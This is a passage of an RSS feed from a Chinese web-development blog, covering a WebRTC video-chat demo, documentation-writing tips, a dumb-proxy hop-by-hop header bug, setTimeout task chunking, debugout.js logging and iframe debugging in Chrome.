&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180209125722_GO0Ee0_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-再上在线例子点击此处httpswangduanduangithubiowebrtcdemoschat-with-your-friendhtml&#34;&gt;3. 再上在线例子&lt;a href=&#34;https://wangduanduan.github.io/webrtc/demos/chat-with-your-friend.html&#34;&gt;点击此处&lt;/a&gt;&lt;/h1&gt;
&lt;h1 id=&#34;4-源码分析&#34;&gt;4. 源码分析&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 产生随机数
if (!location.hash) {
    location.hash = Math.floor(Math.random() * 0xFFFFFF).toString(16);
}
// 获取房间号
var roomHash = location.hash.substring(1);

// 放置你自己的频道id, 这是我注册了ScaleDrone 官网后，创建的channel
// 你也可以自己创建
var drone = new ScaleDrone(&amp;#39;87fYv4ncOoa0Cjne&amp;#39;);
// 房间名必须以 &amp;#39;observable-&amp;#39;开头
var roomName = &amp;#39;observable-&amp;#39; + roomHash;
var configuration = {
    iceServers: [{
        urls: &amp;#39;stun:stun.l.google.com:19302&amp;#39; // 使用谷歌的stun服务
    }]
};

var room;
var pc;
function onSuccess() {}

function onError(error) {
    console.error(error);
}

drone.on(&amp;#39;open&amp;#39;, function(error){
    if (error) { return console.error(error);}

    room = drone.subscribe(roomName);
    room.on(&amp;#39;open&amp;#39;, function(error){
        if (error) {onError(error);}
    });

    // 已经链接到房间后，就会收到一个 members 数组，代表房间里的成员
    // 这时候信令服务已经就绪
    room.on(&amp;#39;members&amp;#39;, function(members){
        console.log(&amp;#39;MEMBERS&amp;#39;, members);

        // 如果你是第二个链接到房间的人，就会创建offer
        var isOfferer = members.length === 2;
        startWebRTC(isOfferer);
    });
});

// 通过Scaledrone发送信令消息
function sendMessage(message) {
    drone.publish({
        room: roomName,
        message
    });
}

function startWebRTC(isOfferer) {
    pc = new RTCPeerConnection(configuration);

    // 当本地ICE Agent需要通过信号服务器发送信息到其他端时
    // 会触发icecandidate事件回调
    pc.onicecandidate = function(event){
        if (event.candidate) {
            sendMessage({ &amp;#39;candidate&amp;#39;: event.candidate });
        }
    };

    // 如果用户是第二个进入的人，就在negotiationneeded 事件后创建sdp
    if (isOfferer) {
        // onnegotiationneeded 在要求sesssion协商时发生
        pc.onnegotiationneeded = function() {
            // 创建本地sdp描述 SDP (Session Description Protocol) session描述协议
            pc.createOffer().then(localDescCreated).catch(onError);
        };
    }

    // 当远程数据流到达时，将数据流装载到video中
    pc.onaddstream = function(event){
        remoteVideo.srcObject = event.stream;
    };

    // 获取本地媒体流
    navigator.mediaDevices.getUserMedia({
        audio: true,
        video: true,
    }).then( function(stream) {
        // 将本地捕获的视频流装载到本地video中
        localVideo.srcObject = stream;

        // 将本地流加入RTCPeerConnection 实例中 发送到其他端
        pc.addStream(stream);
    }, onError);

    // 从Scaledrone监听信令数据
    room.on(&amp;#39;data&amp;#39;, function(message, client){
        // 消息是我自己发送的，则不处理
        if (client.id === drone.clientId) {
            return;
        }

        if (message.sdp) {
            // 设置远程sdp, 在offer 或者 answer后
            pc.setRemoteDescription(new RTCSessionDescription(message.sdp), function(){
                // 当收到offer 后就接听
                if (pc.remoteDescription.type === &amp;#39;offer&amp;#39;) {
                    pc.createAnswer().then(localDescCreated).catch(onError);
                }
            }, onError);
        }
        else if (message.candidate) {
            // 增加新的 ICE canidatet 到本地的链接中
            pc.addIceCandidate(
                new RTCIceCandidate(message.candidate), onSuccess, onError
            );
        }
    });
}

function localDescCreated(desc) {
    pc.setLocalDescription(desc, function(){
        sendMessage({ &amp;#39;sdp&amp;#39;: pc.localDescription });
    },onError);
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;5-webrtc简介&#34;&gt;5. WebRTC简介&lt;/h1&gt;
&lt;h2 id=&#34;51-介绍&#34;&gt;5.1. 介绍&lt;/h2&gt;
&lt;p&gt;WebRTC 是一个开源项目，用于Web浏览器之间进行实时音频视频通讯，数据传递。
WebRTC有几个JavaScript APIS。 点击链接去查看demo。&lt;/p&gt;</description>
    </item>
    <item>
      <title>如何写好技术文档?</title>
      <link>https://wdd.js.org/posts/2018/02/how-to-write-a-technical-document/</link>
      <pubDate>Fri, 09 Feb 2018 12:52:57 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/how-to-write-a-technical-document/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;本文来自于公司内部的一个分享。
在文档方面，对内的一些接口文档主要是用swagger来写的。虽然可以在线测试，比较方便。但是也存在着一些更新不及时，swgger文档无法导出成文件的问题。
在对外提供的文档方面：我主要负责做一个浏览器端的一个js sdk。文档还算可以&lt;a href=&#34;https://github.com/wangduanduan/wellclient&#34;&gt;github地址&lt;/a&gt;，所以想把一些写文档的心得分享给大家。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;1-衡量好文档的唯一标准是什么&#34;&gt;1. 衡量好文档的唯一标准是什么？&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180209125351_QEkv8l_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;Martin(Bob大叔)曾在《代码整洁之道》一书打趣地说：当你的代码在做 Code Review 时，审查者要是愤怒地吼道：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;“What the fuck is this shit?”
“Dude, What the fuck！”
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等言辞激烈的词语时，那说明你写的代码是 Bad Code，如果审查者只是漫不经心的吐出几个&lt;/p&gt;
&lt;p&gt;&lt;code&gt;“What the fuck?”，&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180209125409_sQvHfi_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;那说明你写的是 Good Code。衡量代码质量的唯一标准就&lt;code&gt;是每分钟骂出“WTF” 的频率&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;衡量文档的标准也是如此。&lt;/p&gt;
&lt;h1 id=&#34;2-好文档的特点&#34;&gt;2. 好文档的特点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;简洁&lt;/code&gt;：一句话可以说完的事情，就不要分两句话来说。并不是文档越厚越好，太厚的文档大多没人看。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;准确&lt;/code&gt;: 字段类型，默认值，备注，是否必填等属性说明。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;逻辑性&lt;/code&gt;: 文档如何划分？ 利于查看。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;demo胜千言&lt;/code&gt;: 好的demo胜过各种字段说明，可以复制下来直接使用。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;读者心&lt;/code&gt;: 从读者的角度考虑, 方法尽量简洁。可以传递一个参数搞定的事情，绝对不要让用户去传两个参数。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;及时更新&lt;/code&gt;: 不更新的文档比bug更严重。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;向后兼容&lt;/code&gt;: 不要随意废弃已有的接口或者某个字段，除非你考虑到这样做的后果。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;建立文档词汇表&lt;/code&gt;：每个概念只有一个名字，不要随意起名字，名不正则言不顺。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;格式统一&lt;/code&gt;：例如时间格式。我曾见过2017-09-12 09:32:23, 或2017.09.12 09:32:23或2017.09.12 09:32:23。变量名user_name, userName。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;使用专业词语&lt;/code&gt;：不要过于口语化&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-总结-写出好文档要有以下四点&#34;&gt;3. 总结: 写出好文档要有以下四点&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;逻辑性&lt;/code&gt;：便于查找&lt;/li&gt;
&lt;li&gt;&lt;code&gt;专业性&lt;/code&gt;: 值得信赖，质量保证&lt;/li&gt;
&lt;li&gt;&lt;code&gt;责任心&lt;/code&gt;：及时更新，准确性，向后兼容&lt;/li&gt;
&lt;li&gt;&lt;code&gt;读者心&lt;/code&gt;：你了解的东西，别人可能并不清楚。从读者的角度去考虑，他们需要什么，而不是一味去强调你能提供什么。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;4-写文档的工具&#34;&gt;4. 写文档的工具&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;markdown: 方便快捷，可以导出各种格式的文件&lt;/li&gt;
&lt;li&gt;swagger: 功能强大，需要部署，不方便传递文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;5-markdown-工具推荐&#34;&gt;5. markdown 工具推荐&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://leanote.com/&#34;&gt;蚂蚁笔记&lt;/a&gt; 这是我正使用的。
&lt;ul&gt;
&lt;li&gt;全平台（mac windows ios）有客户端，和浏览器端&lt;/li&gt;
&lt;li&gt;笔记可以直接公布为博客&lt;/li&gt;
&lt;li&gt;支持独立域名&lt;/li&gt;
&lt;li&gt;标签很好用&lt;/li&gt;
&lt;li&gt;支持思维导图&lt;/li&gt;
&lt;li&gt;支持历史记录&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.zybuluo.com/mdeditor#411452&#34;&gt;cmd-markdown&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;有道云笔记&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;6-文档之外&#34;&gt;6. 文档之外&lt;/h1&gt;
&lt;p&gt;公司有个同事，我曾问他使用什么搜索一些技术文档，他说用百度。作为一个翻墙老司机，我惊诧的问他：你为什么不用谷歌去搜索。他说他不会翻墙。我只能呵呵一笑。&lt;/p&gt;</description>
    </item>
    <item>
      <title>哑代理 - TCP链接高Recv-Q，内存泄露的罪魁祸首</title>
      <link>https://wdd.js.org/posts/2018/02/tcp-high-recv-q-or-send-q-reasons/</link>
      <pubDate>Thu, 08 Feb 2018 21:58:31 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/tcp-high-recv-q-or-send-q-reasons/</guid>
      <description>&lt;h1 id=&#34;1-问题现象&#34;&gt;1. 问题现象&lt;/h1&gt;
&lt;p&gt;使用&lt;code&gt;netstat -ntp&lt;/code&gt;命令时发现，Recv-Q 1692012 异常偏高（正常情况下，该值应该是0），导致应用占用过多的内存。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tcp 1692012 0 172.17.72.4:48444 10.254.149.149:58080 ESTABLISHED 27/node
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;问题原因：&lt;code&gt;代理的转发时，没有删除逐跳首部&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-什么是hop-by-hop-逐跳首部&#34;&gt;2. 什么是Hop-by-hop 逐跳首部？&lt;/h1&gt;
&lt;p&gt;http首部可以分为两种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;端到端首部 End-to-end: 端到端首部代理在转发时必须携带的&lt;/li&gt;
&lt;li&gt;逐跳首部 Hop-by-hop: 逐跳首部只对单次转发有效，代理在转发时，必须删除这些首部&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;逐跳首部有以下几个, &lt;code&gt;这些首部在代理进行转发前必须删除&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Connetion&lt;/li&gt;
&lt;li&gt;Keep-Alive&lt;/li&gt;
&lt;li&gt;Proxy-Authenticate&lt;/li&gt;
&lt;li&gt;Proxy-Authortization&lt;/li&gt;
&lt;li&gt;Trailer&lt;/li&gt;
&lt;li&gt;TE&lt;/li&gt;
&lt;li&gt;Transfer-Encodeing&lt;/li&gt;
&lt;li&gt;Upgrade&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-什么是哑代理&#34;&gt;3. 什么是哑代理？&lt;/h1&gt;
&lt;p&gt;很多老的或简单的代理都是盲中继(blind relay),它们只是将字节从一个连接转发到另一个连接中去,不对Connection首部进行特殊的处理。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180222111857_Wi3Sye_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;(1)在图4-15a中 Web客户端向代理发送了一条报文,其中包含了Connection:Keep-Alive首部,如果可能的话请求建立一条keep-alive连接。客户端等待响应,以确定对方是否认可它对keep-alive信道的请求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(2)  哑代理收到了这条HTTP请求,但它并不理解 Connection首部(只是将其作为一个扩展首部对待)。代理不知道keep-alive是什么意思,因此只是沿着转发链路将报文一字不漏地发送给服务器(图4-15b)。但Connection首部是个逐跳首部,只适用于单条传输链路,不应该沿着传输链路向下传输。接下来,就要发生一些很糟糕的事情了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(3)  在图4-15b中,经过中继的HTTP请求抵达了Web服务器。当Web服务器收到经过代理转发的Connection: Keep-Alive首部时,会误以为代理(对服务器来说,这个代理看起来就和所有其他客户端一样)希望进行keep-alive对话!对Web服务器来说这没什么问题——它同意进行keep-alive对话,并在图4-15c中回送了一个Connection: Keep-Alive响应首部。所以,此时W eb服务器认为它在与代理进行keep-alive对话,会遵循keep-alive的规则。但代理却对keep-alive一无所知。不妙。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(4)  在图4-15d中,哑代理将Web服务器的响应报文回送给客户端,并将来自Web服务器的Connection: Keep-Alive首部一起传送过去。客户端看到这个首部,就会认为代理同意进行keep-alive对话。所以,此时客户端和服务器都认为它们在进行keep-alive对话,但与它们进行对话的代理却对keep-alive一无所知。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(5)  由于代理对keep-alive一无所知,所以会将收到的所有数据都回送给客户端,然后等待源端服务器关闭连接。但源端服务器会认为代理已经显式地请求它将连接保持在打开状态了,所以不会去关闭连接。这样,代理就会挂在那里等待连接的关闭。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(6)  客户端在图4-15d中收到了回送的响应报文时,会立即转向下一条请求,在keep-alive连接上向代理发送另一条请求(参见图4-15e)。而代理并不认为同一条连接上会有其他请求到来,请求被忽略,浏览器就在这里转圈,不会有任何进展了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;(7)  这种错误的通信方式会使浏览器一直处于挂起状态,直到客户端或服务器将连接超时,并将其关闭为止。 &amp;ndash;《HTTP权威指南》&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是HTTP权威指南中，关于HTTP哑代理的描述。这里这里说了哑代理会造成的一个问题。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;这种错误的通信方式会使浏览器一直处于挂起状态,直到客户端或服务器将连接超时,并将其关闭为止。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;实际上，我认为哑代理还是造成以下问题的原因&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TCP链接高Recv-Q&lt;/li&gt;
&lt;li&gt;tcp链接不断开，导致服务器内存过高，内存泄露&lt;/li&gt;
&lt;li&gt;节点iowait高&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在我们自己的代理的代码中，我有发现，在代理进行转发时，只删除了headers.host, 并没有删除headers.Connection等逐跳首部的字段&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;delete req.headers.host

var option = {
  url: url,
  headers: req.headers
}

var proxy = request(option)
req.pipe(proxy)
proxy.pipe(res)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-解决方案&#34;&gt;4. 解决方案&lt;/h1&gt;
&lt;p&gt;解决方案有两个， 我推荐使用第二个方案，具体方法参考&lt;a href=&#34;https://wdd.js.org/express-proxy-middleware-demo.html&#34;&gt;Express 代理中间件的写法&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>定时器学习：利用定时器分解耗时任务案例</title>
      <link>https://wdd.js.org/posts/2018/02/settimeout-to-splice-big-work/</link>
      <pubDate>Thu, 08 Feb 2018 14:09:54 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/settimeout-to-splice-big-work/</guid>
      <description>&lt;p&gt;对于执行时间过长的脚本，有的浏览器会弹出警告，说页面无响应。有的浏览器会直接终止脚本。总而言之，浏览器不希望某一个代码块长时间处于运行状态，因为js是单线程的。一个代码块长时间运行，将会导致其他任何任务都必须等待。从用户体验上来说，很有可能发生页面渲染卡顿或者点击事件无响应的状态。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果一段脚本的运行时间超过5秒，有些浏览器（比如Firefox和Opera）将弹出一个对话框警告用户该脚本“无法响应”。而其他浏览器，比如iPhone上的浏览器，将默认终止运行时间超过5秒钟的脚本。&amp;ndash;《JavaScript忍者秘籍》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;JavaScript忍者秘籍里有个很好的比喻：页面上发生的各种事情就好像一群人在讨论事情，如果有个人一直在说个不停，其他人肯定不乐意。我们希望有个裁判，定时的切换其他人来说话。&lt;/p&gt;
&lt;p&gt;Js利用定时器来分解任务，关键点有两个。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;按什么维度去分解任务&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;任务的现场保存与现场恢复&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;1-例子&#34;&gt;1. 例子&lt;/h1&gt;
&lt;p&gt;要求：动态创建一个表格，一共10000行，每行10个单元格&lt;/p&gt;
&lt;h2 id=&#34;11-一次性创建&#34;&gt;1.1. 一次性创建&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
	&amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
	&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;table&amp;gt;
	&amp;lt;tbody&amp;gt;&amp;lt;/tbody&amp;gt;
&amp;lt;/table&amp;gt;

&amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;
	var tbody = document.getElementsByTagName(&amp;#39;tbody&amp;#39;)[0];

	var allLines = 10000;
	// 每次渲染的行数

	console.time(&amp;#39;wd&amp;#39;);
	for(var i=0; i&amp;lt;allLines; i++){
		var tr = document.createElement(&amp;#39;tr&amp;#39;);

		for(var j=0; j&amp;lt;10; j++){
			var td = document.createElement(&amp;#39;td&amp;#39;);

			td.appendChild(document.createTextNode(i+&amp;#39;,&amp;#39;+j));
			tr.appendChild(td);
		}

		tbody.appendChild(tr);
	}
	console.timeEnd(&amp;#39;wd&amp;#39;);

&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;总共耗时180ms, 浏览器已经给出警告！[Violation] &#39;setTimeout&#39; handler took 53ms&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208141029_DSFYi3_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;12-分批次动态创建&#34;&gt;1.2. 分批次动态创建&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
	&amp;lt;meta charset=&amp;#34;utf-8&amp;#34;&amp;gt;
	&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;

&amp;lt;table&amp;gt;
	&amp;lt;tbody&amp;gt;&amp;lt;/tbody&amp;gt;
&amp;lt;/table&amp;gt;

&amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;
	var tbody = document.getElementsByTagName(&amp;#39;tbody&amp;#39;)[0];

	var allLines = 10000;
	// 每次渲染的行数
	var everyTimeCreateLines = 80;
	// 当前行
	var currentLine = 0;

	setTimeout(function renderTable(){
		console.time(&amp;#39;wd&amp;#39;);
		for(var i=currentLine; i&amp;lt;currentLine+everyTimeCreateLines &amp;amp;&amp;amp; i&amp;lt;allLines; i++){
			var tr = document.createElement(&amp;#39;tr&amp;#39;);

			for(var j=0; j&amp;lt;10; j++){
				var td = document.createElement(&amp;#39;td&amp;#39;);

				td.appendChild(document.createTextNode(i+&amp;#39;,&amp;#39;+j));
				tr.appendChild(td);
			}

			tbody.appendChild(tr);
		}
		console.timeEnd(&amp;#39;wd&amp;#39;);

		currentLine = i;

		if(currentLine &amp;lt; allLines){
			setTimeout(renderTable,0);
		}
	},0);

&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;这次异步按批次创建，没有耗时的警告。因为控制了每次代码在50ms内运行。实际上每80行耗时约10ms左右。这就不会引起页面卡顿等问题。&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>关于JavaScropt函数式编程，我多么希望能早点看到这本书</title>
      <link>https://wdd.js.org/posts/2018/02/js-functional-programming/</link>
      <pubDate>Thu, 08 Feb 2018 14:06:22 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/js-functional-programming/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;我父亲以前跟我说过，有些事物在你得到之前是无足轻重的，得到之后就不可或缺了。微波炉是这样，智能手机是这样，互联网也是这样——老人们在没有互联网的时候过得也很充实。对我来说，函数的柯里化（curry）也是这样。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208140707_POIKmq_Screenshot.jpeg&#34;&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208140717_25soGz_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后我继续看了这本书的中文版。有些醍醐灌顶的感觉。 随之在github搜了一下。
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208140730_aTXsaN_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;我想，即使付费，我也愿意看。&lt;/p&gt;
&lt;p&gt;中文版地址：https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details
github原文地址：https://github.com/MostlyAdequate/mostly-adequate-guide&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208140744_5kvV4A_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-后记&#34;&gt;1. 后记&lt;/h1&gt;
&lt;p&gt;其实我是想学点函数柯里化的东西，然后用谷歌搜索了一下。第一个结果就是这本书。&lt;code&gt;非常感谢谷歌搜索，如果我用百度，可能就没有缘分遇到这本书了。&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>终于找到你！如何将前端console.log的日志保存成文件?</title>
      <link>https://wdd.js.org/posts/2018/02/save-console-log-as-file/</link>
      <pubDate>Thu, 08 Feb 2018 13:56:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/save-console-log-as-file/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;本篇文章来自一个需求，前端websocket会收到各种消息，但是调试的时候，我希望把websoekt推送过来的消息都保存到一个文件里，如果出问题的时候，我可以把这些消息的日志文件提交给后端开发区分析错误。但是在浏览器里，js一般是不能写文件的。鼠标另存为的方法也是不太好，因为会保存所有的console.log的输出。于是，终于找到这个debugout.js。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;debugout.js的原理是将所有日志序列化后，保存到一个变量里。当然这个变量不会无限大，因为默认的最大日志限制是2500行，这个是可配置的。另外，debugout.js也支持在localStorage里存储日志的。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208135709_Z3SQQV_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-debugoutjshttpsgithubcominorganikdebugoutjs&#34;&gt;1. &lt;a href=&#34;https://github.com/inorganik/debugout.js&#34;&gt;debugout.js&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;一般来说，可以使用打开console面板，然后右键save，是可以将console.log输出的信息另存为log文件的。但是这就把所有的日志都包含进来了，如何只保存我想要的日志呢？&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;（调试输出）从您的日志中生成可以搜索，时间戳，下载等的文本文件。 参见下面的一些例子。&lt;/p&gt;
&lt;p&gt;Debugout的log（）接受任何类型的对象，包括函数。 Debugout不是一个猴子补丁，而是一个单独的记录类，你使用而不是控制台。&lt;/p&gt;
&lt;p&gt;调试的一些亮点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在运行时或任何时间获取整个日志或尾部&lt;/li&gt;
&lt;li&gt;搜索并切片日志&lt;/li&gt;
&lt;li&gt;更好地了解可选时间戳的使用模式&lt;/li&gt;
&lt;li&gt;在一个地方切换实时日志记录（console.log）&lt;/li&gt;
&lt;li&gt;可选地将输出存储在window.localStorage中，并在每个会话中持续添加到同一个日志&lt;/li&gt;
&lt;li&gt;可选地，将日志上限为X个最新行以限制内存消耗&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下图是使用downloadLog方法下载的日志文件。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208135722_EwunDY_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;官方提供的demo示例，欢迎试玩。http://inorganik.github.io/debugout.js/&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208135732_Ltowzp_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-使用&#34;&gt;2. 使用&lt;/h1&gt;
&lt;p&gt;在脚本顶部的全局命名空间中创建一个新的调试对象，并使用debugout的日志方法替换所有控制台日志方法：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var bugout = new debugout();

// instead of console.log(&amp;#39;some object or string&amp;#39;)
bugout.log(&amp;#39;some object or string&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-api&#34;&gt;3. API&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;log() -像console.log(), 但是会自动存储&lt;/li&gt;
&lt;li&gt;getLog() - 返回所有日志&lt;/li&gt;
&lt;li&gt;tail(numLines) - 返回尾部执行行日志，默认100行&lt;/li&gt;
&lt;li&gt;search(string) - 搜索日志&lt;/li&gt;
&lt;li&gt;getSlice(start, numLines) - 日志切割&lt;/li&gt;
&lt;li&gt;downloadLog() - 下载日志&lt;/li&gt;
&lt;li&gt;clear() - 清空日志&lt;/li&gt;
&lt;li&gt;determineType() - 一个更细粒度的typeof为您提供方便&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;4-可选配置&#34;&gt;4. 可选配置&lt;/h1&gt;
&lt;p&gt;···
// log in real time (forwards to console.log)
self.realTimeLoggingOn = true;
// insert a timestamp in front of each log
self.useTimestamps = false;
// store the output using window.localStorage() and continuously add to the same log each session
self.useLocalStorage = false;
// set to false after you&amp;rsquo;re done debugging to avoid the log eating up memory
self.recordLogs = true;
// to avoid the log eating up potentially endless memory
self.autoTrim = true;
// if autoTrim is true, this many most recent lines are saved
self.maxLines = 2500;
// how many lines tail() will retrieve
self.tailNumLines = 100;
// filename of log downloaded with downloadLog()
self.logFilename = &amp;rsquo;log.txt&amp;rsquo;;
// max recursion depth for logged objects
self.maxDepth = 25;
···&lt;/p&gt;</description>
    </item>
    <item>
      <title>如何浏览器里调试iframe里层的代码？</title>
      <link>https://wdd.js.org/posts/2018/02/debug-code-in-iframe/</link>
      <pubDate>Thu, 08 Feb 2018 13:53:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/debug-code-in-iframe/</guid>
      <description>&lt;p&gt;之前一直非常痛苦，在iframe外层根本获取不了里面的信息，后来使用了postMessage用传递消息来实现，但是用起来还是非常不方便。&lt;/p&gt;
&lt;p&gt;其实浏览器本身是可以选择不同的iframe的执行环境的。例如有个变量是在iframe里面定义的，你只需要切换到这个iframe的执行环境，你就可以随意操作这个环境的任何变量了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;这个小技巧，对于调试非常有用，但是我直到今天才发现。&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-chrome&#34;&gt;1. Chrome&lt;/h1&gt;
&lt;p&gt;这个小箭头可以让你选择不同的iframe的执行环境，可以切换到你的iframe环境里。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208135509_koFmKH_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
